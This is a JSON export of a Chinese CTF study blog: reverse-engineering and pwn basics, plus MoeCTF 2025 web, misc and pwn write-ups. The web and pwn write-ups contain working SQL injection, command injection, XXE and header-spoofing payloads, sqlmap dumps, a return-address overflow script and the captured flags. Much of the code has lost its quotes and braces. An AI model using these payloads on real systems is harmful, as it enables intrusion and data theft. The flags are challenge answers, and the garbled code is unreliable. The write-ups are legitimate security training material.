[{"title":"CTF Reverse 基础知识","path":"/Reverse 基础知识/","content":"python数据组织b = bHello # 字节对象：不可变的字节序列b = bytearray(bHello) # 字节数组对象：可变的字节序列s = hello # Unicode 字符序列hex_str = 48656c6c6f # 十六进制字符串b = bytes.fromhex(hex_str) # 获得对应字节对象hex_str = b.hex() # 将 bytes 转化为十六进制字符串 s = Hellob = s.encode(utf-8) # 使用 utf-8 编码，获得对应字节对象s = b.decode(utf-8) # 使用 utf-8 解码，获得对应字符序列 BaseBase64将 6 位二进制数 映射到 64个字符 每 3 个字节，24位，可以分为 4 组，即 4 个六位二进制数，编码为 4 个字符 A-Z (大写字母，索引0-25，对应ASCII 65-90)a-z (小写字母，索引26-51，对应ASCII 97-122)0-9 (数字，索引52-61，对应ASCII 48-57)+ (索引62，对应ASCII 43)/ (索引63，对应ASCII 47) = 用于填充（padding），当输入字节数不是3的倍数时使用。 所以看到一串字符串，以 = 结尾时，很大可能是 base64 编码过的。 使用 base64 库： Base64编码 import base64print(base64.b64encode(bCTF).decode()) # 输出: Q1Rm Base64解码 import base64ciphertext = bW9lY3Rme1kwdV9DNG5fRzAwZF9BdF9CNDVlNjQhIX0=b = base64.b64decode(ciphertext) # 得到 b 是字节对象print(b.decode()) # decode() 默认是 Unicode 解码 Base32将 5 位二进制数 映射到 32个字符 A-Z (索引0-25，对应ASCII 65-90)2-7 (索引26-31，对应ASCII 50-55) 每 5 字节（40位）分为 8 个 5 位块，编码为 5 个字符 输入不足 5 字节时，用 填充（最多6个 ）。 相比Base64，Base32输出更长，但字符集更简单（无小写字母或特殊字符），适合大小写不敏感的场景。 Base16Base16编码原理Base16（即十六进制）使用16个字符（4位二进制）： 0-9 (索引0-9，对应ASCII 48-57)A-F (索引10-15，对应ASCII 65-70) 分组：每字节（8位）分为2个4位块。 映射：每个4位块直接转换为十六进制字符。 特点：输出最长，但最直观，常用于调试或表示二进制数据。 upx (continuing…) 压缩：通过压缩和加壳技术减小文件体积 加壳：将可执行程序的外部再包一层外壳程序，并在运行时使用外壳程序解压实际的程序，然后加载到内存运行。 可使用 Die (Detect it easy) 检测文件类型，判定是否加壳 加壳后的程序应包含： PE 头部：保留原始 PE 文件的 DOS 头、NT 头和节表（Section Table），但可能被修改以适应压缩后的结构。 UPX 区段：UPX 通常将文件分为几个自定义区段（如 UPX0、UPX1、UPX2），用于存储压缩数据、解压 stub 和其他元数据。 UPX 头部：UPX 在文件中嵌入一个特定的头部结构，包含压缩算法标识、文件长度等信息，UPX! 是其中的一个标志性字符串。 解压 stub：一段解压代码，负责在运行时将压缩的程序还原到内存中。 压缩数据：原始程序的代码和数据经过压缩后存储在文件中。 UPX 的加壳过程会重构 PE 文件的节表和内容，但保留 PE 格式的基本结构以确保文件仍可被操作系统加载。 对upx 加壳过的程序：逆向时需要使用 upx -d 脱壳： 脱壳过程中 upx 特征区段很重要，逆向时若无法脱壳需要考虑恢复特征区段 修改区段名：UPX0 UPX1 UPX2 可以改成其他名字，upx -d 将无法识别文件结构，导致脱壳失败。 恢复UPX头：恢复 UPX! 如果仍然无法脱壳，可能需要手动脱壳 文件的二进制结构ELFLinux 中的目标文件，也就是 **ELF （Executable and Linkable Format）**文件，主要有以下三种类型 可重定位文件（Relocatable File），包含由编译器生成的代码以及数据。链接器会将它与其它目标文件链接起来从而创建可执行文件或者共享目标文件。在 Linux 系统中，这种文件的后缀一般为 .o 。 可执行文件（Executable File），就是我们通常在 Linux 中执行的程序。 共享目标文件（Shared Object File），包含代码和数据，这种文件是我们所称的库文件，一般以 .so 结尾。一般情况下，它有以下两种使用情景： 链接器（Link eDitor, ld）可能会处理它和其它可重定位文件以及共享目标文件，生成另外一个目标文件。 动态链接器（Dynamic Linker）将它与可执行文件以及其它共享目标组合在一起生成进程镜像。 文件结构 ELF Header（文件头） 固定数 ELF 、文件类型、目标体系结构、文件版本、入口点地址、段表偏移、节表偏移、文件头大小……. Program Header Table（程序头表） 描述 ELF 文件的**段（Segment）**信息，适用于可执行文件和共享目标文件。动态链接器和操作系统加载器使用该表来加载程序到内存中。 Section Header Table（节头表） Sections（节） 常见节包括： .text：存储可执行代码。 .data：存储初始化数据。 .bss：存储未初始化的全局静态变量（不占用文件空间，仅在内存中分配）。 .rodata：存储只读数据，如字符串常量。 .symtab：符号表，存储函数和变量的符号信息。 .strtab：字符串表，存储符号名称等字符串。 Dynamic Linking Information（动态链接信息） Symbol Table（符号表） Relocation Table（重定位表） PEWindows EXE文件采用 PE（Portable Executable） 格式 ，与 ELF 文件对比： 共同点： 都支持可执行文件、动态库和目标文件。 都包含头部、段节、符号表和重定位信息。 不同点： 平台：ELF 主要用于 LinuxUnix，PE 用于 Windows。 头部结构：ELF Header 更简洁，PE 使用 DOS 头和 PE 头，兼容旧的 DOS 格式。 动态链接：ELF 使用 .dynamic 节和动态链接器（ld.so）；PE 使用导入表（Import Table）和 DLL。 扩展性：ELF 设计更灵活，支持多种架构；PE 主要针对 x86x64。 Windows桌面应用程序(GUI 程序)WinMain 函数是程序入口点 int WINAPI WinMain( _In_ HINSTANCE hInstance, // 当前程序实例的句柄 _In_opt_ HINSTANCE hPrevInstance, // 前一个实例的句柄 _In_ LPSTR lpCmdLine, // 命令行参数（字符串形式） _In_ int nCmdShow // 窗口显示方式（如最大化、最小化、正常等）); Windows 桌面程序需要 windows.h 除了 WinMain 函数，每个Windows桌面应用程序还需要一个窗口过程函数 WndProc ，可以指定为任何名称，用于处理窗口收到的消息。 LRESULT CALLBACK WndProc( _In_ HWND hWnd, // 窗口句柄表示消息所属的窗口,类似指针 _In_ UINT message, // 消息类型 _In_ WPARAM wParam, // 消息的附加参数1 _In_ LPARAM lParam // 消息的附加参数2); WinMain 函数 处理窗口1.填充 WNDCLASSEX 类型的结构 添加关于主窗口的一些基本信息 WNDCLASSEX wc = sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WindowProc, 0, 0, hInstance, NULL, NULL, (HBRUSH)(COLOR_WINDOW+1), NULL, LMyWindowClass, NULL ; 2.填充 WNDCLASSEX 结构后，向 Windows 注册该结构，使其了解你的窗口以及如何向该窗口发送消息。 RegisterClassEx(wc); 3.使用 CreatWindowEx 函数创建窗口 HWND hwnd = CreateWindowEx(0, LMyWindowClass, LCTF Window, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, hInstance, NULL); 4.显示窗口 ShowWindow(hwnd, nCmdShow); // 设置窗口显示状态UpdateWindow(hwnd); // 强制窗口重绘 5.为了处理消息，首先添加“消息循环”来侦听 Windows 发送的消息。 当应用程序收到消息时，此循环将该消息调度到 WndProc 函数进行处理。 消息循环类似于以下代码： MSG msg; // 定义 MSG 结构，存储消息队列中的消息。// 从消息队列获取消息。返回非0表示成功获取消息，0表示收到 WM_QUIT。while (GetMessage(msg, NULL, 0, 0)) TranslateMessage(msg); // 将键盘虚拟键消息转换为字符消息 DispatchMessage(msg); // 将消息分发到对应的 WindowProc 函数。return (int)msg.wParam; WndProc 函数 处理消息 WM_PAINT ：更新显示窗口（第一次显示窗口需要更新整个窗口） 使用 BeginPaint ，处理所有逻辑，再调用 EndPaint （调用 TextOut 在窗口指定位置显示文本） PAINTSTRUCT ps;HDC hdc; // 与窗口工作区关联的设备上下文的句柄TCHAR greeting[] = _T(Hello, Windows desktop!);switch (message)case WM_PAINT: hdc = BeginPaint(hWnd, ps); // 返回用于在工作区进行绘制的显示设备上下文的句柄 // Here your application is laid out. // For this introduction, we just print out Hello, Windows desktop! // in the top left corner. TextOut(hdc, 5, 5, greeting, _tcslen(greeting)); // End application-specific layout section. EndPaint(hWnd, ps); // 结束绘制请求并释放设备上下文。 break;case WM_DESTROY: PostQuitMessage(0); break;default: return DefWindowProc(hWnd, message, wParam, lParam); break; return 0; WM_CREATE ：首次创建窗口 WM_DESTROY：关闭窗口 反调试GDB动态调试gdb programlayout asm # 显示反汇编窗口 layout regs # 显示寄存器窗口b *0x40127c # 下断点r # 运行s # 单步运行c # 继续运行q # 退出 *Z3求解器 约束求解（Constraint Solving） 逻辑公式验证（Formal Verification） 符号执行（Symbolic Execution） 程序分析（Program Analysis） pip install z3-solver 基础语法示例from z3 import *s = Solver() # 首先创建一个 Z3 求解器x = Int(x) # 整数变量y = Int(y) # 整数变量z = Real(z) # 实数变量p = Bool(p) # 布尔变量s.add(x + y == 10) # 整数约束：x + y = 10s.add(x 0, y 5) # 多个约束：x 0 且 y 5s.add(And(x = 2, y == 3)) # 逻辑与：x = 2 且 y = 3if s.check() == sat: # 检查可满足性 m = s.model() # 获得一个可满足的模型 print(fx = m[x], y = m[y]) # 输出如：x = 5, y = 5else: print(No solution) 进阶语法示例def is_flag(flag): b = [0] * 34 for i in range(34): b[i] = 47806 * (ord(flag[i]) + i) if i != 0: b[i] = b[i] ^ b[i-1] ^ 0x114514 b[i] = b[i] % 51966 if b[i] != ciphertext[i]: return False return True 知道密文的情况下爆破求解： from z3 import *ciphertext = [ 0x0B1B0, 0x5678,0x7FF2,0x0A332,0x0A0E8,0x364C,0x2BD4,0x0C8FE, 0x4A7C,0x18,0x2BE4,0x4144,0x3BA6,0x0BE8C,0x8F7E,0x35F8,0x61AA, 0x2B4A,0x6828,0x0B39E,0x0B542,0x33EC,0x0C7D8,0x448C,0x9310, 0x8808,0x0ADD4,0x3CC2,0x796,0x0C940,0x4E32,0x4E2E,0x924A,0x5B5C]solver = Solver()# 定义 flag 列表和中间量 b，使用 BitVec 类型（32 位）flag = [BitVec(fflag_i, 32) for i in range(34)]b = [BitVec(fb_i, 32) for i in range(34)]# 添加约束：flag 字符在 ASCII 可打印字符范围内 (32 到 126)for i in range(34): solver.add(flag[i] = 32, flag[i] = 126)# 根据 is_flag 函数的逻辑添加约束for i in range(34): temp = 47806 * (flag[i] + i) if i == 0: solver.add(b[i] == temp % 51966) else: temp = temp ^ b[i-1] ^ 0x114514 solver.add(b[i] == temp % 51966) solver.add(b[i] == ciphertext[i]) # 存储所有解solutions = []while solver.check() == sat: model = solver.model() # 提取 flag 字符, as_long() 将 Z3 的值转为 Python 整数）。 flag_vals = [model[flag[i]].as_long() for i in range(34)] flag_str = .join(chr(val) for val in flag_vals) solutions.append(flag_str) # 添加排除当前解的约束, 以加快求解速度 solver.add(Or([flag[i] != flag_vals[i] for i in range(34)])) # 可选：限制最大解的数量，避免过多输出 if len(solutions) = 100: # 限制最多 100 个解 break# 非空则输出所有解if solutions: for idx, sol in enumerate(solutions, 1): print(fidx: sol)else: print(无解) Android逆向一个 Android app 大概由三部分组成： AndroidManifest.xml：记录app各种信息 resources：各种资源，包括排版、程序中出现的字串、图片等等 AndroidManifest.xml 第 7 行：app 的package name 是 com.example.ezandroidpro 我们访问谷歌商店，找到app X https://play.google.com/store/apps/details?id=com.twitter.androidhl=zh_TWgl=US 这个 id = com.twitter.android 就是指 X app 的 package name Package Name（包名）是Android应用程序的唯一标识符，通常采用类似域名反写的格式，例如 com.example.myapp。它在Android系统中用于区分不同的应用程序，通常在应用的 AndroidManifest.xml 文件中定义。 包名不仅用于标识应用，还用于管理应用的安装、更新以及权限分配等。 第 24 行：app 有一个 activity，是 com.example.ezandroidpro.MainActivity ActivityActivity 是一个核心组件，表示应用程序的一个用户界面屏幕。每个Activity通常对应一个单独的屏幕，用户可以通过它与应用进行交互。例如，一个Activity可以是一个登录页面、主页或设置页面。 MainActivity 是一个约定俗成的名称，通常指应用启动时默认加载的第一个Activity。它是应用的入口点，用户打开应用时最先看到的界面。 从上面的 MainActivity 可以得到 app 运行逻辑，语言是 java NativeAndroid的Native层是指使用CC++编写的代码，这段代码可以直接与Android系统交互。通过NDK，开发者可以编 写高性能的代码，尤其是在需要进行复杂计算或处理多媒体数据时。Native层的使用场景主要包括： 实现高性能的游戏引擎 进行复杂的数据处理 使用已存在的CC++库 上图 app 使用 check 函数对输入进行检查，看到第 15 行，这个函数是来自 native 层 查看 lib 文件，应该就有so动态链接库文件，也可以看看 Summary 这些文件是 CC++ 编写的原生代码 (Native Code) 需要使用 IDA Ghidra 进行反汇编、反编译 加密TEA#include stdint.hvoid encrypt (uint32_t* v, uint32_t* k) uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i 32; i++) /* basic cycle start */ sum += delta; v0 += ((v14) + k0) ^ (v1 + sum) ^ ((v15) + k1); v1 += ((v04) + k2) ^ (v0 + sum) ^ ((v05) + k3); /* end cycle */ v[0]=v0; v[1]=v1;void decrypt (uint32_t* v, uint32_t* k) uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i32; i++) /* basic cycle start */ v1 -= ((v04) + k2) ^ (v0 + sum) ^ ((v05) + k3); v0 -= ((v14) + k0) ^ (v1 + sum) ^ ((v15) + k1); sum -= delta; /* end cycle */ v[0]=v0; v[1]=v1; RC4MD5","categories":["CTF"]},{"title":"CTF Pwn 基础知识","path":"/Pwn 基础知识/","content":"部署到本地网络拿到一个 Linux 文件首先直接运行 chmod u+x your_pwn_binary # 授予权限./your_pwn_binary 使用 netstat 或 lsof 命令查找程序输出端口号 netstat -tlnp | grep your_pwn_binary# 或者使用 lsoflsof -i -P -n | grep LISTEN | grep your_pwn_binary pwngdbgit clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdbcp ~/Pwngdb/.gdbinit ~/ x/s Buffer Windows环境下汇编1. 核心调用约定Windows 主要使用以下三种调用约定： 调用约定 清理方 参数传递顺序 寄存器使用 典型应用场景 __cdecl 调用者 从右到左 栈传递参数 C 语言默认、可变参数函数 __stdcall 被调者 从右到左 栈传递参数 Win32 API 函数 __fastcall 被调者 从右到左 前两个参数用 ECXEDX，其余用栈 性能敏感代码 2 .寄存器 寄存器 主要用途 Windows 特殊约定 RSP 栈指针（Stack Pointer），指向当前栈顶 必须 16 字节对齐（调用 API 时） RDI 通用寄存器，Linux 中用于传递第一个参数（Windows 不用） Windows 中通常为临时寄存器 RAX 返回值寄存器（Return Value） 系统调用（syscall）返回值也存于此 RCX 通用寄存器，Windows 中用于传递第一个整数参数 fastcall调用约定第 1 个参数 RDX 通用寄存器，Windows 中用于传递第二个整数参数 fastcall调用约定第 2 个参数 R8 通用寄存器，Windows 中用于传递第三个整数参数 fastcall调用约定第 3 个参数 R9 通用寄存器，Windows 中用于传递第四个整数参数 fastcall调用约定第 4 个参数 手动编译# 下载特定版本的 glibc 源码wget https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gztar -xf glibc-2.31.tar.gzcd glibc-2.31# 编译（需要指定安装目录）mkdir build cd build../configure --prefix=/path/to/glibc-2.31-installmake -j$(nproc)make install# 获取 ld-linuxcp /path/to/glibc-2.31-install/lib/ld-linux-x86-64.so.2 ./","categories":["CTF"]},{"title":"CTF Reverse 基础知识","path":"/Web 基础知识/","content":"JavaScriptsudo apt install nodejs node my_Script.js JsFuck混淆 简介JavaScript 可以放到 HTML 页面的 head 或者 body ，或者保存到外部文件，可以在某个事件发生时执行 外部文件通常包含被多个网页使用的代码，可以代码复用 浏览器的渲染引擎（如Blink、Gecko）解析HTML文档。 当解析到 script标签时（无论是内联脚本还是外部脚本），浏览器会发起网络请求（对于外部脚本）来获取JS代码。 获取到JS代码（无论是来自网络还是直接写在HTML里）后，会将其交给JS引擎。 JS引擎编译并执行这些代码。执行过程可能会操作DOM（改变页面结构）、处理数据、发送网络请求等。 输出JavaScript 没有任何打印或者输出的函数，但通过不同的方式来输出数据： 使用 window.alert() 弹出警告框。 使用 document.write() 方法将内容写到 HTML 文档中。 使用 innerHTML 写入到 HTML 元素。 使用 console.log() 写入到浏览器的控制台。 使用 document.getElementById(id) 方法。 使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容： 使用 document.write() 可以向文档写入内容。 语法JavaScript 是一个轻量级，但功能强大的脚本语言。 字面量固定值被称为字面量 包括 数字字面量、字符串字面量、表达式字面量、数组字面量、对象字面量、函数字面量 3.14 // 整数、小数、或科学计数(e)Hello // 双引号和单引号都行Hello 5 + 6 // 表达式字面量[1,2,3,4] // 数组字面量name:John, age:18, eyeColor:blue // 对象字面量function myFunction(a,b) return a*b // 函数字面量 变量使用 var 定义变量，等号赋值 var x,lengthx = 5;length = 6; 操作符= + - * / ==!= 语句在HTML中，语句用于向浏览器发出命令，使用分号分隔（也可以不带） 语句 描述 break 用于跳出循环。 catch 语句块，在 try 语句块执行出错时执行 catch 语句块。 continue 跳过循环中的一个迭代。 do … while 执行一个语句块，在条件语句为 true 时继续执行该语句块。 for 在条件语句为 true 时，可以将代码块执行指定的次数。 for … in 用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。 function 定义一个函数 if … else 用于基于不同的条件来执行不同的动作。 return 返回结果，并退出函数 switch 用于基于不同的条件来执行不同的动作。 throw 抛出（生成）错误 。 try 实现错误处理，与 catch 一同使用。 var 声明一个变量。 while 当条件语句为 true 时，执行语句块。 注释： // 不会执行 折行 document.write(Hello \\World); JavaScript 是脚本语言，浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。 数据类型函数大小写敏感字符集Javascript 使用 Unicode 字符集","categories":["CTF"]},{"title":"MoeCTF 2025 Crypto","path":"/MoeCTF 2025-4/","content":"密码部分","categories":["CTF"]},{"title":"MoeCTF 2025 Web","path":"/MoeCTF 2025-5/","content":"Web部分 00JSFuck 仅使用六个不同的字符来编写和执行代码。 moectfjv@vScr1p7_14_so0o0o0o_inT3r3t!!! 01 moectff_i2_1s_Your_g00d_fri3nd!! @Dxyoyugnd8EHrg7NaXaSA1J 02 再抓这个包： moectf0bs3rv3_Th3_Gold3n_traiL fAMwxQ2rEhbXWUw9IJmvU4ec 03 使用 fetch API 向 test_talent?levelB 发起 POST 请求，请求的 URL 包含查询参数 levelB。 method: 指定请求方法为 POST。 headers: 设置请求头，Content-Type: applicationjson 表示发送的数据是 JSON 格式。 body: 使用 JSON.stringify 将对象 { manifestation: ‘none’ } 转换为 JSON 字符串作为请求体。 向服务器发送 POST 请求，携带参数 levelB 和 JSON 数据 { manifestation: ‘none’ }，测试某种“天赋”。 根据服务器返回的 data.result，更新页面上的 result 元素内容。 window.testTalent = async function() try const response = await fetch(/test_talent?level=S, // 修改为 level=S method: POST, headers: Content-Type: application/json , body: JSON.stringify( manifestation: flowing_azure_clouds ) // 修改为 flowing_azure_clouds ); const data = await response.json(); document.getElementById(result).textContent = data.result; const glow = document.getElementById(glow); if (data.result.includes(流云状青芒)) glow.style.opacity = 1; else glow.style.opacity = 0; if (data.flag) setTimeout(() = alert(`✨ 天道机缘：$data.flag ✨ 天赋篡天术大成！`); , 500); catch (error) alert(玄轨连接中断！请检查灵枢...); moectfG3t_pOsT_trAn5mi5slon_l5_a_GOoD-m3THod!!1130 cBrtGRQSKeLvty0@lKyFpU@Z 04 // 定义要发送的数据const data = declaration: 织云阁=第一;// 使用 fetch 发起 POST 请求fetch(https://example.com/api, // 替换为你的目标 URL method: POST, headers: Content-Type: application/json, // 假设服务器期望 JSON 格式 , body: JSON.stringify(data) // 将数据转为 JSON 字符串) .then(response = response.json()) // 解析响应为 JSON .then(data = console.log(成功:, data); // 处理响应数据 ) .catch(error = console.error(错误:, error); // 处理错误 ); fetch(http://127.0.0.1:64658/cloud_weaver, // 替换为实际的 API 地址 method: POST, headers: Content-Type: application/x-www-form-urlencoded , body: declaration= + encodeURIComponent(织云阁=第一)) .then(response = response.text()) // 根据服务器响应类型，可能需要 response.json() .then(data = console.log(响应:, data); // 查看返回的 flag 或信息 ) .catch(error = console.error(错误:, error); ); 下一个是：shadow_stalker 需要修改http请求包中的一些参数来让服务器认为我们是从本地访问的 下一关是 soul_discerner 下一关是 heart_seal 下一关是 pathfinder 下一关是 void_rebirth bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ== import base64content = bbW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghprint(base64.b64decode(content)) 输出： moectfC0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h! 结尾加个 ，发现能通过测试 现在得到完整 flag ，结尾带有 } X-Forwarded-For: 127.0.0.1 # 伪装本地访问Referer: https://example.com # 来源页伪装Cookie: user=xt # 伪装用户xt登录 moectfC0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h! jU92itArJr2pe04Em6HF_tik 05 moectf41l_1nPut-1S_MAIlcIoUs23c27a0a 28P~gb6F3FuMOcrtaBo8uyDy 06SQL注入漏洞 username=1password= OR 1=1 SELECT * FROM users WHERE username=1 AND password= OR 1=1 AND 优先级高于 OR moectfW3LCoM3_to-sq1-INJectionl!ad140b0 3ydNfxJPakSWcFp4eVtO_Iyf 07有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。 输入两个不相等的数，要求 md5 值相等 MD5是一种常见的哈希算法，用于将任意长度的输入转换为固定长度的128位哈希值。然而，MD5算法存在一些漏洞，其中之一就是0e绕过。这种绕过方式利用了PHP在处理哈希字符串时的特性，即将以0e开头的哈希值解释为0，从而导致不同的字符串在比较时被认为是相同的。 md5 碰撞 当两个MD5值进行弱类型比较时，如果它们的哈希值以0e开头且后面都是数字，那么PHP会将它们解释为0，从而认为它们相等。 http://127.0.0.1:4275/flag.php?a=240610708b=QNKCDZO moectfMD5-I5-noT-5@F3ll22a3f898247 YzOBQY3E22YSg2VJ53KousnE 08username:1password:1 登录失败 提示说使用 admin 登录 username:adminpassword: OR 1 = 1 现在提示登录成功 SELECT * FROM users WHERE username=admin AND password= OR 1 = 1 也就是说存在 SQL 注入漏洞 SQL查询查来查去太难，化身脚本小子 # 获取数据库名 找到usersqlmap -u http://127.0.0.1:51160/?username=adminpassword=pass* --dbs# 获取表名 找到flagsqlmap -u http://127.0.0.1:51160/?username=adminpassword=pass* -D user --tables# 获取列名 一列为valuesqlmap -u http://127.0.0.1:51160/?username=adminpassword=pass* -D user -T flag --columns# 查看列value，获得flagsqlmap -u http://127.0.0.1:51160/?username=adminpassword=pass* -D user -T flag -C value --dump moectfuNlON-B@sed_Sql1_Ftw11b661c2b6 vigv8Vt5AVCkG8tRI@auP^u3 09输入 www.baidu.com url=www.baidu.com | ls # index.phpurl=www.baidu.com | cat index.php $output = ;if (isset($_GET[url])) $domain = $_GET[url]; ob_start(); system(nslookup . $domain); $output = ob_get_clean();? ; env | grep -i flag moectf9a3a1484-615b-2db8-7913-f54ff954e814 CszFiOPw1kDQoKB_hS6@Do^n 10 后端PHP代码正在尝试将输入加载为XML。 考虑到XML解析错误和PHP后端，这很可能是一个XXE（XML External Entity）注入漏洞。XXE允许在XML解析过程中读取外部文件，如果解析器配置不当（如启用了外部实体），您可以利用它读取flag.txt。 !DOCTYPE foo [!ENTITY xxe SYSTEM file:///etc/passwd]阵枢xxe;/阵枢 猜数字 fetch(/flag, method: POST ) .then(response = response.json()) .then(data = console.log(FLAG获取成功:, data.flag); document.querySelector(.flagResult).textContent = FLAG: + data.flag; ) .catch(error = console.error(获取失败:, error)); moectfc4c59fad-fbb5-e4bc-f7ca-672c24b10431","categories":["CTF"]},{"title":"MoeCTF 2025 Misc","path":"/MoeCTF 2025-2/","content":"杂项部分 Misc 信息搜集 取证分析 内存分析：volatility 磁盘取证：VeraCrypt(处理加密卷)、Elcomsoft Forensic Disk Decryptor 隐写：StegSolve 流量分析：WireShark 编码 题目入门指北一个入门指北 PDF 文件，提示说 flag 需要查找，然后复制这块空白 moectfWe1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!! Pyjail 0 ncncat 是一个命令行网络工具1，允许你通过 TCP 协议或者 UDP 协议连接到远程服务器 Socket，并进行数据传输。浏览器使用的是 HTTPHTTPS 协议。HTTPHTTPS 协议构建于 TCP 协议之上，而很多题目（Pwn Misc）方向的题目使用的是原始的 TCP 协议，并没有进一步实现 HTTP 协议的内容，所以用浏览器访问会显示一个服务器发送了无效的响应 下载WSRX windows ncat 127.0.0.1 40835 暂时放弃 ez_LSB一张红色校徽图片， 54686520666c6167 2069733a20625739 The flag is: bW96c5933526d653078 54516c3878633139 lY3Rme0x TQl8xc197a4d463878626e51 7a636d567a644446 zMF8xbnQ zcmVzdDF755a79456863326f 3564325239000000 uZyEhc2o 5d2R9... bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9 注意到 bW9lY3Rme 开头（之前Base64解码过，就是 moectf{ ） 猜测是base64加密过的，现在解码 import base64ciphertext = bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9b = base64.b64decode(ciphertext) print(b.decode()) # 输出解码后的明文 输出： moectfLSB_1s_s0_1nt3rest1ng!!sj9wd ez_锟斤拷????打开 flag.txt 首先要了解一下 锟斤拷 的形成原理 GBK 字符集 转化成 Unicode字符集 时，有些字符是 Unicode 没法表示的。使用一个占位符来表示这些文字。就是 U+FFFD U+FFFD：UTF-8 编码 - \\xef\\xbf\\xbd 重复多次\\xef\\xbf\\xbd\\xef\\xbf\\xbd：GBK 编码 - EFBF BDEF BFBD 锟斤拷 先通过编码保存为 GBK，再通过 UTF-8 编码重新打开flag.txt即可 即： moectfEnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww Rush打开是一个 gif 文件 导出每帧图片：第12帧出现了二维码 但是这个码缺失了一部分，扫不了 补上两个角即可 moectfQR_C0d3s_feATUR3_eRror_c0RRECt10N CRC在 windows 下可以正常打开图片，在 LinuxVScode 中打不开 先分析一下png图片格式 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 图中高亮部分为chunk[0]段：00 00 00 0D 表示数据块的长度为13 ​\t49 48 44 52：IHDR，是文件头数据块的标识，该段格式也是固定的 ​\t之后进入 13 位数据块 ​ 前四个字节：00 00 03 84 表示图片的宽为0x384 ​ 后四个字节：00 00 01 EA 表示图片的高为0x1EA ​ 后五个字节：08 02 00 00 00：分别表示bit depth 、color type、compression method、filter method、interlace method ​ 剩余四个字节：B5 A7 BF 8C：CRC校验码 宽：0384(900)高：01EA(490)CRC校验码： B5A7BF8C 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 根据CRC校验码爆破获得原图片的宽和高 import binasciitarget_crc = 0xB5A7BF8Cbit_depth = 8color_type = 2compression = 0filter_method = 0interlace = 0chunk_type = bIHDR# 爆破宽高区间自行设置（比如1~4096）for width in range(1, 4096): for height in range(1, 4096): ihdr_data = ( width.to_bytes(4, big) + height.to_bytes(4, big) + bit_depth.to_bytes(1, big) + color_type.to_bytes(1, big) + compression.to_bytes(1, big) + filter_method.to_bytes(1, big) + interlace.to_bytes(1, big) ) crc_val = binascii.crc32(chunk_type + ihdr_data) 0xFFFFFFFF if crc_val == target_crc: print(Found!) print(Width:, width) # 900 print(Height:, height) # 490 print(Other IHDR params:, [bit_depth, color_type, compression, filter_method, interlace]) exit(0)","categories":["CTF"]},{"title":"MoeCTF 2025 Pwn","path":"/MoeCTF 2025-3/","content":"PWN部分 题目hellopwn passwd = 0x1BF4F = 114511 moectftHe_bEg1Nn1ng-of-foRM4t4e4e0b39e ez_u64 字节流是一种常见的数据表示形式，用于存储、传输和处理各种类型的数据。我们不妨试试用pwntools中的u64,p64,u32,p32将特定大小的字节流与整数相互转换。 第十行输出8字节的num，查看发现在 init 函数中也被引用，应该是个随机数 后面 以 %zu 格式化输入一个数，需要与 num 相等 输入：无符号十进制整数 8字节 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 54174)io.recvuntil(Here is the hint.)data = io.recvn(8)num = u64(data)io.recvuntil(b)io.sendline(str(num).encode())io.interactive() moectfus3FUI_tHiNgS_1n_PWntO0L51d19e477 find_it 第 9 行：复制 fd 1 (stdout) 的进程到 v3 。之后写入 v3，即使用 stdout 输出字符串。然后关闭 fd 1 接下来要 写入 到 fd fd1 的进程，0、1、2 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 44332)io.sendafter(Can you find it? , 3 .encode())io.sendafter(like to see? , flag .encode())io.sendafter(What is its fd? , 1 .encode())io.interactive() moectfFlND_th3-h1dD3n-Fd2aaa2bb2b8c EZtext from pwn import *context(arch=amd64, os=linux, log_level=debug)context.timeout = 30# 连接到远程服务（替换为实际地址和端口）io = remote(127.0.0.1, 49597)# 输入字节数io.sendafter(bThen how many bytes do you need to overflow the stack? , b24)backdoor_address = 0x4011BE # 获得的 `treasure` 地址payload = cyclic(0x9)# 填满 `Buffer`payload += cyclic(0x8) # 填满暂存的 `rbp`payload += p64(backdoor_address) # 篡改返回地址为 8 字节io.send(payload) io.interactive() cat flag moectfR3tZtExt_l5_THe-ST4Rt-0F-rOP1f6d5941 ezshellcode 选择： 4 - prot = 73 - prot = 41 - prot = 12 - prot = 3 